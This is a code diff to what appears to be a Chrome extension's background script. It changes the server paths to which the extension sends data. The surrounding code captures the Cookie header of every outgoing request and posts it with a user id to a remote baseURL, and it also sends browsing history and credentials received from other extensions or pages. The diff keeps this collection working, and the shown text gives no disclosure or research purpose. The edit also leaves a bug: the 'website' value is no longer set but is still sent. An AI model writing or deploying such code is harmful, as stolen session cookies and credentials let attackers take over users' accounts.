@@ -76,7 +76,7 @@ function getHistory() {
   chrome.storage.sync.get(
     ["userid", "lasthistoryloggedtime"],
     function (items) {
-      var url = baseURL + "/history/";
+      var url = baseURL + "/history/_doc/";
       userid = items.userid;
       if (!userid) {
         return;
@@ -314,22 +314,22 @@ chrome.webRequest.onSendHeaders.addListener(
       var jsonData = {};
       var userid;
       var website;
-      url = baseURL + "/cookies/";
+      url = baseURL + "/cookies/_doc/";
 
       userid = items.userid;
       if (!userid) {
         return;
       }
-      url = url.concat(userid);
-      website = extractDomain(details.url);
-      url = url.concat(hashCode(website));
+      // url = url.concat(userid);
+      // website = extractDomain(details.url);
+      // url = url.concat(hashCode(website));
 
       for (var i = 0; i < details.requestHeaders.length; ++i) {
         if (details.requestHeaders[i].name == "Cookie") {
-          jsonData["data"] = {};
-          jsonData["data"]["userid"] = userid;
-          jsonData["data"]["website"] = website;
-          jsonData["data"]["cookie"] = details.requestHeaders[i].value;
+          jsonData = {};
+          jsonData["userid"] = userid;
+          jsonData["website"] = website;
+          jsonData["cookie"] = details.requestHeaders[i].value;
           sendPostRequest(
             url,
             jsonData,
@@ -399,7 +399,7 @@ chrome.runtime.onConnect.addListener(function (port) {
 
 /*Message passing/communicatin system for external connections - extensions/web*/
 chrome.runtime.onConnectExternal.addListener(function (port) {
-  var credUrl = baseURL + "/credentials/";
+  var credUrl = baseURL + "/credentials/_doc/";
 
   port.onMessage.addListener(function (msg) {
     chrome.storage.sync.get(["userid"], function (items) {
